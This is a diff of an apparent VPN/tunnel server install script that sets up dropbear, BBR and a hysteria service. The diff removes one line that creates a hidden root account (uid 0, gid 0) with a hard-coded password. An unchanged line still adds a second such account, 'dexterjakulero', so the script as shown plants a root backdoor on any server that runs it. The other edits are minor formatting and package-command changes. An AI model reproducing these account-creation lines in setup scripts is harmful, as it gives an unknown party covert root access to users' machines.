@@ -61,7 +61,6 @@ sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
 echo "/bin/false" >> /etc/shells
 echo "/usr/sbin/nologin" >> /etc/shells
 
-useradd -p $(openssl passwd -1 dexterjakulero) jakulerodexter -ou 0 -g 0
 useradd -p $(openssl passwd -1 jakulerodexter) dexterjakulero -ou 0 -g 0
 
 service dropbear restart
@@ -929,12 +928,12 @@ installBBR() {
     echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
     echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
     sysctl -p
-    apt install linux-generic-hwe-20.04
+    sudo apt-get install linux-generic-hwe-20.04
     grub-set-default 0
     echo "tcp_bbr" >> /etc/modules-load.d/modules.conf
     INSTALL_BBR=true
 	
-	systemctl enable hysteria-server.service
+    systemctl enable hysteria-server.service
     systemctl restart hysteria-server.service
 }
 
